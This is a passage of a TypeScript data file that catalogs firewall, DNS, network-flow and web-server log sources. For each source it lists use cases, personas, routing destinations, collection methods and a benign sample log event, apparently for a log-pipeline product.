// @ts-nocheck
export const dataSources = [
  {
    category: 'Firewalls',
    icon: '🛡️',
    sources: [
      {
        id: 'palo-alto-traffic',
        name: 'Palo Alto Traffic Logs',
        vendor: 'Palo Alto Networks',
        description: 'Firewall traffic logs capturing session-level network activity including source/destination, application identification, zone traversal, and policy actions.',
        status: 'available',
        useCases: ['Security Detection', 'NOC Troubleshooting', 'Policy Validation', 'Application Connectivity', 'Volume Anomaly Detection', 'Incident Investigation', 'Forensic Search'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Platform Engineering', 'Incident Response', 'Compliance'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce firewall log field count by 35-45% for SIEM destinations while preserving all detection-required fields' },
            { persona: 'Team Leader', job: 'Demonstrate measurable SIEM ingestion cost savings within 30 days of dual-use routing implementation' },
            { persona: 'Data Engineer', job: 'Route full-fidelity logs to Lake at raw storage cost while sending optimized subsets to expensive analytics platforms' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 7+ detection alerts using pre-enriched fields without writing custom parsing logic' },
            { persona: 'Data End User / Analyst', job: 'Investigate denied traffic spikes and cross-zone anomalies using pre-built Cribl Search queries' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor interface traffic imbalance and session aging trends to detect routing issues before user impact' },
            { persona: 'Data End User / Analyst', job: 'Track application connectivity failures and bandwidth utilization across zones' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Get Palo Alto syslog traffic parsed and routed to SIEM + Lake within 30 minutes using pre-built pack functions' },
            { persona: 'Data Engineer', job: 'Configure multi-destination routing with per-destination field filtering in a single pipeline' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Google Chronicle', 'Microsoft Sentinel', 'Elastic Security', 'Dynatrace', 'Datadog', 'New Relic', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS)',
        sampleEvent: '<14>Sep 20 13:03:58 PA-VM 1,2025/09/20 13:03:58,44A1B3FC68F5304,TRAFFIC,end,2049,2025/09/20 13:03:58,34.217.108.226,10.0.0.102,34.217.108.226,10.0.2.65,splunk,,,incomplete,vsys1,untrusted,trusted,ethernet1/3,ethernet1/2,log-forwarding-default,2025/09/20 13:03:58,574326,1,53722,8088,53722,8088,0x400064,tcp,allow,296,296,0,4,2025/09/20 13:03:45,7,any,0,730277,0x0,United States,10.0.0.0-10.255.255.255,0,4,0,aged-out,0,0,0,0,,PA-VM,from-policy,,,0,,0,,N/A,0,0,0,0'
      },
      {
        id: 'zscaler-web-logs',
        name: 'Zscaler Internet Access (ZIA) Web Logs',
        vendor: 'Zscaler',
        description: 'Cloud proxy web transaction logs from Zscaler Internet Access capturing URL categorization, SSL inspection results, DLP policy actions, threat detection verdicts, user identity, and bandwidth consumption. Events delivered via Nanolog Streaming Service (NSS) in JSON or CEF format.',
        status: 'available',
        useCases: ['Data Exfiltration Detection', 'Malware Download Blocking', 'C2 Callback Detection', 'Shadow IT Discovery', 'Acceptable Use Policy Enforcement', 'SSL Inspection Bypass Monitoring', 'Bandwidth Abuse', 'User Risk Scoring', 'Compliance Reporting'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Cloud Security', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress duplicate web transaction fields and reduce payload size by 40-50% before SIEM delivery' },
            { persona: 'Data Engineer', job: 'Split high-volume proxy logs into security-relevant (threats/blocks) for SIEM and full-fidelity for Lake, cutting SIEM cost by 60%' },
            { persona: 'Team Leader', job: 'Report monthly SIEM license savings from Zscaler log optimization with before/after GB comparison' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Create 5+ detection rules for C2 callbacks, data exfiltration patterns, and SSL inspection bypass attempts' },
            { persona: 'Data End User / Analyst', job: 'Identify shadow IT SaaS applications used by department with URL categorization and user identity correlation' },
            { persona: 'Jack of All Trades', job: 'Detect DLP policy violations and suspicious file downloads exceeding 100MB threshold per session' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Ensure 100% of web traffic logs are retained for 13 months in Lake to satisfy regulatory audit requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate acceptable use policy violation reports grouped by department and category within 5 minutes' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Zscaler NSS JSON logs via HTTP source and normalize to common schema within 45 minutes' },
            { persona: 'Data Engineer', job: 'Enrich web logs with threat intelligence lookups and user department context before routing to destinations' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Nanolog Streaming Service (NSS → Syslog/TCP to Cribl) / Cloud NSS (HTTPS POST to Cribl HTTP source) / S3 Export',
        sampleEvent: '{"datetime":"2026-06-06T14:32:08.000Z","user":"jperks@cribl.io","department":"Customer Success","url":"https://drive.google.com/file/d/1a2b3c4d5e/view","hostname":"drive.google.com","action":"Allowed","urlcategory":"Cloud Storage","urlclass":"Business Use","dlpengine":"None","dlpdictionaries":"None","threatname":"None","threatclass":"None","deviceowner":"jperks","devicehostname":"LAPTOP-JP01","clientpublicIP":"203.0.113.42","clientprivateIP":"192.168.1.105","reqsize":1842,"respsize":34521,"contenttype":"text/html","reqmethod":"GET","respcode":"200","riskscore":0,"location":"Austin, TX","cloudname":"Zscaler Dallas","pagerisk":0,"malwarecategory":"None","malwareclass":"None","obfuscatedclientIP":"","obfuscatedcloudname":"","productversion":"6.2","rulelabel":"Default_Allow","ruletype":"FWD_RULE","sslinspection":"Yes","sslprotocol":"TLSv1.3"}'
      },
      {
        id: 'checkpoint-fw',
        name: 'Check Point Firewall & Threat Prevention',
        vendor: 'Check Point Software',
        description: 'Security gateway logs from Check Point Next-Generation Firewalls including traffic accept/drop/reject events, IPS blade detections, Anti-Bot verdicts, URL Filtering actions, Application Control decisions, Threat Emulation (sandboxing) results, and identity awareness events. Logs exported via Log Exporter (syslog/CEF/LEEF) or SmartConsole API.',
        status: 'available',
        useCases: ['Network Intrusion Detection', 'Bot Activity Blocking', 'Application Control', 'Threat Emulation (Sandboxing)', 'URL Filtering Enforcement', 'Zero-Day Protection', 'VPN Monitoring', 'Policy Compliance', 'DDoS Mitigation', 'Identity-Based Security'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Remove redundant blade-specific fields from unified logs, reducing event size by 30-40% for SIEM destinations' },
            { persona: 'Data Engineer', job: 'Route IPS/Anti-Bot/Threat Emulation alerts to SIEM at full fidelity while sending traffic accepts to Lake only' },
            { persona: 'Team Leader', job: 'Quantify per-blade log volume contribution and present optimization targets to reduce SIEM spend by 25%+' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules spanning IPS signatures, bot verdicts, and URL filtering blocks with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Correlate Threat Emulation sandboxing results with network connections to identify patient-zero hosts within minutes' },
            { persona: 'Jack of All Trades', job: 'Detect zero-day threats via Threat Emulation verdicts and correlate with identity-awareness user context' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track rule hit counts across security blades to identify misconfigured or overly permissive policies within 24 hours' },
            { persona: 'Data End User / Analyst', job: 'Monitor VPN tunnel stability and failover events to ensure <99.9% uptime SLA compliance' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain all firewall deny logs for 12+ months in immutable storage to meet PCI-DSS Section 10 requirements' },
            { persona: 'Data End User / Analyst', job: 'Produce audit-ready reports showing all policy changes and rule modifications within configurable time windows' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Log Exporter (Syslog CEF/LEEF/Splunk format) / SmartConsole Open Telemetry Export / OPSEC LEA / Check Point Harmony Connect',
        logFormat: 'CEF/LEEF syslog or semi-colon delimited. Key fields: action, src, dst, service, proto, rule, product (Firewall/IPS/Anti-Bot/URL Filtering/Threat Emulation), severity, confidence_level, protection_name, malware_family.',
        avgEPS: '5,000-100,000 EPS depending on gateway throughput and blade count',
        sampleEvent: 'CEF:0|Check Point|VPN-1 & FireWall-1|R82|Accept|5|act=Accept src=10.1.2.100 dst=203.0.113.50 spt=52341 dpt=443 proto=6 cs2=ethernet1/2 cs2Label=Interface Direction deviceDirection=0 cp_uuid=1a2b3c4d-e5f6-7890 rule_name="Allow-Outbound-HTTPS" product=Firewall layer_name="Network" match_id=15 parent_rule=0 rule_uid={AAAAAAAA-BBBB-CCCC} xlatesrc=198.51.100.10 xlatedst=203.0.113.50 NAT_rulenum=1 NAT_addtnl_rulenum=0 src_machine_name=WORKSTATION-01@CORP src_user_name=jperks@cribl.io identity_src=AD Query app_name=SSL_v3 app_category=Network_Protocols app_risk=1'
      },
      {
        id: 'cisco-asa',
        name: 'Cisco ASA / Firepower Threat Defense',
        vendor: 'Cisco',
        description: 'Firewall event logs from Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD). Captures connection build/teardown events (message IDs 302013-302016), denied traffic (106001-106023), NAT translations, VPN session events (713228, 722022), failover events, threat detection (IPS), and AMP file verdicts. Events delivered as syslog in Cisco-specific format with numeric message IDs.',
        status: 'available',
        useCases: ['Connection Monitoring', 'Denied Traffic Analysis', 'VPN Session Tracking', 'NAT Translation Issues', 'Failover Monitoring', 'Threat Detection (IPS)', 'ACL Hit Counts', 'Botnet Filtering', 'Identity Firewall', 'Site-to-Site VPN Health'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Network Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume connection build/teardown events (302013-302016) to summary records, reducing SIEM volume by 50-70%' },
            { persona: 'Data Engineer', job: 'Route verbose informational syslog (severity 6-7) to Lake while forwarding only security-relevant events (severity 1-4) to SIEM' },
            { persona: 'Team Leader', job: 'Present quarterly cost avoidance metrics showing dollars saved per ASA/FTD appliance from log optimization' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for denied traffic patterns (106xxx), VPN brute force (722xxx), and ACL bypass attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate VPN session anomalies including impossible travel and concurrent session abuse across gateways' },
            { persona: 'Jack of All Trades', job: 'Correlate NAT translation failures with denied traffic to identify misconfigured access policies within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor failover events and connection table exhaustion trends to prevent outages with 30-minute advance warning' },
            { persona: 'Data End User / Analyst', job: 'Track AnyConnect VPN session counts and bandwidth by gateway to right-size infrastructure capacity' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse Cisco ASA syslog message IDs into structured fields and route to SIEM + Lake within 20 minutes using pre-built packs' },
            { persona: 'Data Engineer', job: 'Normalize ASA and FTD events into a common firewall schema for cross-vendor correlation in downstream analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS) / NSEL (NetFlow Security Event Logging) / Cisco FMC eStreamer / Cisco SecureX integration',
        logFormat: 'Cisco syslog format: %ASA-severity-message_id: message_text. Key message IDs: 302013/302014 (TCP build/teardown), 302015/302016 (UDP), 106001-106023 (denied), 713228 (IKE), 722022-722051 (AnyConnect). Severity 1-7.',
        avgEPS: '5,000-200,000 EPS depending on throughput and logging level',
        sampleEvent: 'Jun 06 14:32:08 ASA-01 : %ASA-6-302013: Built inbound TCP connection 574326 for outside:203.0.113.42/52341 (203.0.113.42/52341) to inside:10.1.2.100/443 (198.51.100.10/443) duration 0:00:07 bytes 15234 TCP FINs\nJun 06 14:32:09 ASA-01 : %ASA-4-106023: Deny tcp src outside:203.0.113.99/44521 dst inside:10.1.2.50/22 by access-group "outside_in" [0x0, 0x0]\nJun 06 14:32:10 ASA-01 : %ASA-6-722022: Group <VPN-Users> User <jperks> IP <203.0.113.42> SVC Message: Connection established with server 198.51.100.1.'
      }
    ]
  },
  {
    category: 'DNS',
    icon: '🌐',
    sources: [
      {
        id: 'windows-dns',
        name: 'Windows DNS Server Logs',
        vendor: 'Microsoft',
        description: 'DNS query and response logs from Windows DNS Server via Analytical ETW channel (Event IDs 256-292) and legacy debug logging. Captures client queries, responses, recursion, zone transfers, and policy actions.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Detection', 'Malware C2 Callbacks', 'Zone Transfer Reconnaissance', 'Resolver Health', 'Query Latency Monitoring', 'NXDOMAIN Spikes', 'Top Talker Analysis', 'DNS Policy Enforcement'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'SRE', 'Active Directory Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for DNS tunneling, DGA patterns, and NXDOMAIN spikes with <5 minute alert latency' },
            { persona: 'Data End User / Analyst', job: 'Hunt for C2 callback patterns by correlating high-entropy domain queries with known threat intelligence feeds' },
            { persona: 'Jack of All Trades', job: 'Detect zone transfer attempts and unauthorized recursive queries from non-sanctioned clients' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate repetitive DNS queries (PTR lookups, health checks) reducing log volume by 60-75% without losing unique query visibility' },
            { persona: 'Data Engineer', job: 'Route only NXDOMAIN, blocked, and high-entropy queries to SIEM while sending full query logs to Lake for forensic search' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DNS resolver latency and query failure rates to detect infrastructure degradation within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Identify top-talking clients and query patterns causing resolver load spikes during business hours' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Collect Windows DNS analytical ETW events via Cribl Edge and deliver parsed records to SIEM within 30 minutes of deployment' },
            { persona: 'Platform Administrator', job: 'Configure Edge collection across 50+ DNS servers with centralized fleet management and health monitoring' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / WEF / File Monitor (dns.log)',
        sampleEvent: '6/6/2026 8:15:32 AM 0E64 PACKET  00000000040DBE50 UDP Rcv 192.168.1.105   b4c2   Q [0001   D   NOERROR] A      (7)finance(3)corp(5)local(0)'
      },
      {
        id: 'infoblox-dns',
        name: 'Infoblox DNS Query Logs',
        vendor: 'Infoblox',
        description: 'DNS query and response logs from Infoblox NIOS appliances and BloxOne DDI. Captures client queries, recursive resolution, RPZ (Response Policy Zone) actions, DHCP-to-DNS correlation, and DNS security events including tunneling detection and DGA indicators via Infoblox Threat Defense.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Detection', 'Malware C2 Callbacks', 'RPZ Block Monitoring', 'Resolver Health', 'Query Latency Monitoring', 'NXDOMAIN Spikes', 'Top Talker Analysis', 'DHCP-DNS Correlation', 'Cache Poisoning Detection'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'SRE', 'Network Engineering', 'DDI Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build RPZ block correlation rules that map blocked domains to originating clients and generate incident tickets within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Investigate DNS tunneling alerts using query length entropy analysis and subdomain frequency patterns' },
            { persona: 'Jack of All Trades', job: 'Correlate Infoblox Threat Defense DGA indicators with endpoint process execution to identify compromised hosts' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress recursive resolution internal chatter and health-check queries, reducing DNS log volume by 55-70% for SIEM' },
            { persona: 'Data Engineer', job: 'Route RPZ hits and security events to SIEM while directing full query/response pairs to Lake for long-term forensics' },
            { persona: 'Team Leader', job: 'Demonstrate 50%+ DNS log cost reduction while maintaining full detection coverage for audit review' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DHCP-DNS correlation gaps and detect stale PTR records causing resolution failures across 500+ subnets' },
            { persona: 'Data End User / Analyst', job: 'Track resolver cache hit ratios and query latency percentiles to maintain sub-50ms p95 response time' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Infoblox NIOS syslog and BloxOne Data Connector feeds into unified pipeline within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Infoblox DNS events to common DNS schema for cross-vendor correlation with Windows DNS and Umbrella' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS from NIOS) / Infoblox Data Connector (BloxOne → S3/HTTP) / SNMP Traps (for RPZ hits)',
        sampleEvent: '06-Jun-2026 14:32:08.123 client 192.168.1.105#54321 (finance.corp.local): query: finance.corp.local IN A + (10.0.1.53)\n06-Jun-2026 14:32:08.456 rpz QNAME NXDOMAIN rewrite finance.corp.local/A/IN via finance.corp.local.rpz-nxdomain.malware-block.local [policy: Malware-Block-Policy]\n06-Jun-2026 14:32:09.789 queries: info: client @0x7f8a1c002340 192.168.1.105#54321 (suspicious-domain.xyz): query: suspicious-domain.xyz IN A -EDC (10.0.1.53)'
      },
      {
        id: 'cisco-umbrella',
        name: 'Cisco Umbrella DNS & Proxy Logs',
        vendor: 'Cisco',
        description: 'Cloud-delivered DNS security and secure web gateway logs from Cisco Umbrella (formerly OpenDNS). Captures DNS query decisions (allowed/blocked/proxied), intelligent proxy inspection results, URL categorization, file inspection verdicts (AMP), DLP matches, cloud firewall events, and identity-based policy actions. Logs delivered via S3 export or Managed S3 bucket integration.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Domain Blocking', 'Malware C2 Callback Prevention', 'Phishing Domain Blocking', 'Shadow IT Discovery', 'Cryptomining Detection', 'Content Category Enforcement', 'Data Loss Prevention', 'Roaming Client Visibility', 'Selective Proxy Inspection'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Cloud Security', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for DGA blocking, cryptomining callbacks, phishing domains, and newly seen domain anomalies' },
            { persona: 'Data End User / Analyst', job: 'Investigate blocked DNS queries by correlating Umbrella decisions with endpoint identity and roaming client location' },
            { persona: 'Jack of All Trades', job: 'Identify selective proxy bypass patterns indicating evasion attempts against DNS-layer security controls' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter allowed queries to known-good domains (CDNs, internal) reducing SIEM ingest by 65-80% while keeping all blocked/proxied events' },
            { persona: 'Data Engineer', job: 'Consolidate DNS, proxy, IP, and CDR log types into unified pipeline with per-type routing and field optimization' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all blocked and proxied requests for 12+ months to satisfy compliance review requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate content category enforcement reports showing policy violations by user group within 10 minutes' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3 Collector to ingest Umbrella CSV exports with automatic schema detection and field mapping within 30 minutes' },
            { persona: 'Data Engineer', job: 'Parse multi-format Umbrella logs (DNS CSV, proxy CSV, IP logs) into normalized schema for unified security analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cisco Umbrella S3 Log Export (Cribl S3 Collector) / Managed S3 bucket / Umbrella Reporting API / Syslog (via Log Management integration)',
        logFormat: 'CSV (S3 export) with multiple log types: dnslogs (DNS queries), proxylogs (intelligent proxy), iplogs (cloud firewall), cdrlogs (cloud delivered firewall). Key fields: Timestamp, InternalIp, ExternalIp, Action, QueryType, Domain, Categories, PolicyIdentity, Verdict.',
        avgEPS: '5,000-100,000 EPS depending on user population and DNS query volume',
        sampleEvent: '"2026-06-06 14:32:08","jperks@cribl.io","LAPTOP-JP01","10.1.2.100","203.0.113.42","Allowed","A","suspicious-domain.xyz","Malware,Newly Seen Domains","Cribl-Prod-Policy","DNS","","","","198.51.100.1","","","","low"'
      }
    ]
  },
  {
    category: 'Network Flow',
    icon: '🔀',
    sources: [
      {
        id: 'netflow',
        name: 'NetFlow (v5/v9)',
        vendor: 'Cisco / Multiple',
        description: 'Network flow telemetry via Cisco NetFlow v5 and v9 protocols. Captures unidirectional flow records with source/destination IPs, ports, protocol, byte/packet counts, TCP flags, ToS/DSCP markings, AS numbers, and interface indexes. NetFlow v9 adds template-based extensibility for MPLS labels, IPv6, and custom fields. Primary source for network traffic analysis without full packet capture.',
        status: 'available',
        useCases: ['Network Traffic Analysis', 'Lateral Movement Detection', 'Data Exfiltration', 'Bandwidth Monitoring', 'Top Talker Identification', 'Service Dependency Mapping', 'DDoS Detection', 'Capacity Planning', 'Anomalous Port Usage', 'Peer-to-Peer Detection'],
        personas: ['Network Security', 'SOC', 'NOC', 'Network Engineering', 'Security Engineering', 'SRE', 'Capacity Planning'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Identify top-10 bandwidth consumers and detect traffic anomalies exceeding 2x baseline within 5-minute windows' },
            { persona: 'Data End User / Analyst', job: 'Map application service dependencies using flow records to validate microsegmentation policies across 100+ subnets' },
            { persona: 'Jack of All Trades', job: 'Detect DDoS volumetric attacks by correlating flow rate spikes with interface utilization thresholds' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build lateral movement detection rules using internal-to-internal flow patterns on non-standard ports with <3 min alerting' },
            { persona: 'Data End User / Analyst', job: 'Identify data exfiltration by flagging outbound flows exceeding 500MB to external IPs not in approved destination lists' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate sampled flow records into 1-minute summaries for capacity planning, reducing storage by 85-90% vs raw flows' },
            { persona: 'Data Engineer', job: 'Route security-relevant flows (denied, non-standard ports, high volume) to SIEM while sending aggregated metrics to monitoring tools' },
            { persona: 'Team Leader', job: 'Demonstrate flow data cost optimization ROI by comparing raw vs aggregated storage costs across retention periods' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale NetFlow collection to handle 500K+ flows/sec across 200+ exporters with zero packet loss at the collector' },
            { persona: 'Data Onboarder', job: 'Deploy NetFlow v5/v9 collection on Cribl Stream with template caching and multi-exporter support within 1 hour' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Stream (NetFlow/IPFIX Collector input) / Cribl Edge (flow collector) / UDP receiver on port 2055/9995',
        logFormat: 'Binary NetFlow v5 (fixed 48-byte records) or v9 (template-based). Decoded fields: src_addr, dst_addr, src_port, dst_port, protocol, bytes, packets, tcp_flags, tos, src_as, dst_as, input_snmp, output_snmp, first_switched, last_switched, flow_duration.',
        avgEPS: '10,000-500,000 flows/sec depending on router count and sampling rate',
        sampleEvent: '{"flow_version":9,"src_addr":"10.1.2.100","dst_addr":"203.0.113.50","src_port":52341,"dst_port":443,"protocol":6,"bytes":15234,"packets":25,"tcp_flags":"0x1b","tos":0,"src_as":64512,"dst_as":13335,"input_snmp":2,"output_snmp":3,"first_switched":"2026-06-06T14:32:01Z","last_switched":"2026-06-06T14:32:08Z","flow_duration_ms":7000,"sampling_rate":1000,"exporter_ip":"10.0.0.1"}'
      },
      {
        id: 'ipfix',
        name: 'IPFIX (IP Flow Information Export)',
        vendor: 'IETF Standard / Multiple',
        description: 'IP Flow Information Export (IPFIX, RFC 7011) — the IETF standard evolution of NetFlow v9. Provides template-based flow records with variable-length fields, enterprise-specific Information Elements, bidirectional flows (biflow), structured data types, and SCTP transport reliability. Supported by Cisco, Juniper, Palo Alto, Fortinet, and most modern network infrastructure.',
        status: 'available',
        useCases: ['Advanced Traffic Analysis', 'Application Performance Monitoring', 'Encrypted Traffic Classification', 'Lateral Movement Detection', 'Network Forensics', 'Capacity Planning', 'SLA Verification', 'QoS Monitoring', 'Microsegmentation Validation', 'Cloud VPC Flow Analysis'],
        personas: ['Network Security', 'SOC', 'NOC', 'Network Engineering', 'Security Engineering', 'SRE', 'Cloud Security'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor bidirectional flow metrics and application classification to validate QoS policy effectiveness across WAN links' },
            { persona: 'Data End User / Analyst', job: 'Perform encrypted traffic classification using flow metadata to identify application types without decryption' },
            { persona: 'Jack of All Trades', job: 'Validate microsegmentation policies by comparing actual IPFIX flows against intended east-west traffic matrices' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Create advanced lateral movement detections using biflow records with enterprise-specific Information Elements for richer context' },
            { persona: 'Data End User / Analyst', job: 'Detect covert channels in encrypted traffic by analyzing flow duration, packet size distribution, and timing patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate bidirectional flows and aggregate into session summaries, reducing storage volume by 80-90% vs raw IPFIX records' },
            { persona: 'Data Engineer', job: 'Extract enterprise-specific IEs (application name, HTTP host) for security analytics while discarding raw flow padding fields' },
            { persona: 'Team Leader', job: 'Compare IPFIX collection cost at various sampling rates and demonstrate optimal cost-to-detection trade-off points' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Manage IPFIX template caching across multi-vendor exporters (Cisco, Juniper, Palo Alto) with zero template timeout gaps' },
            { persona: 'Data Onboarder', job: 'Deploy IPFIX collection with SCTP transport reliability and template auto-discovery within 1 hour for 100+ exporters' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Stream (NetFlow/IPFIX Collector input) / Cribl Edge (flow collector) / UDP/TCP/SCTP on port 4739/4740',
        logFormat: 'Binary IPFIX (RFC 7011) with template and data sets. Supports enterprise IEs (PEN-based), variable-length strings, structured data (basicList, subTemplateList). Common IEs: sourceIPv4Address, destinationIPv4Address, sourceTransportPort, destinationTransportPort, protocolIdentifier, octetDeltaCount, packetDeltaCount, flowStartMilliseconds, flowEndMilliseconds, applicationId.',
        avgEPS: '10,000-1,000,000 flows/sec depending on infrastructure and sampling',
        sampleEvent: '{"observation_domain_id":256,"src_addr":"10.1.2.100","dst_addr":"203.0.113.50","src_port":52341,"dst_port":443,"protocol":6,"octet_delta_count":15234,"packet_delta_count":25,"tcp_control_bits":"0x1b","ip_class_of_service":0,"bgp_src_as":64512,"bgp_dst_as":13335,"ingress_interface":2,"egress_interface":3,"flow_start_ms":"2026-06-06T14:32:01.000Z","flow_end_ms":"2026-06-06T14:32:08.000Z","flow_duration_ms":7000,"application_id":"443:SSL","http_host":"api.example.com","sampling_interval":1000,"exporter_ipv4":"10.0.0.1","biflow_direction":"initiator"}'
      }
    ]
  },
  {
    category: 'Proxy / Web',
    icon: '🔗',
    sources: [
      {
        id: 'nginx-access',
        name: 'NGINX Access & Error Logs',
        vendor: 'NGINX / F5',
        description: 'Web server and reverse proxy access logs capturing client requests, upstream response timing, HTTP status codes, cache behavior, and TLS details. Includes error logs for upstream failures and connection issues.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Brute Force Detection', 'Bot/Scanner Detection', 'Upstream Latency Monitoring', 'Error Rate Alerting', 'Cache Performance', 'Traffic Volume Analysis', 'Path Traversal Detection'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for path traversal, brute force (5+ 401s in 60s), and bot/scanner fingerprints with automated blocking recommendations' },
            { persona: 'Data End User / Analyst', job: 'Investigate web application attack campaigns by correlating source IPs, user agents, and URI patterns across upstream pools' }
          ]},
          { category: 'Operational Visibility', jobs: [
